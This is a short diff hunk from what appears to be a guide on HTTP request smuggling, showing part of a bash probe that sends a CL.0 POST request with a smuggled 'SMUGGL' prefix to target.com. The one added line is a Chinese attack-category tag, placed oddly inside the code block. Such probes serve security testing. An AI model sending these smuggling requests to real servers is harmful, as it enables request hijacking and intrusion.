@@ -84,6 +84,7 @@ Also called "CL.0" or "ignored Content-Length". The front-end reads Content-Leng
 
 ```bash
 # CL.0 probe — send a POST with smuggled prefix after the body
+- 攻击大类:C09 Web应用漏洞利用
 # The backend ignores CL and treats the smuggled bytes as the next request
 {
   echo -en 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nConnection: keep-alive\r\n\r\nSMUGGL'
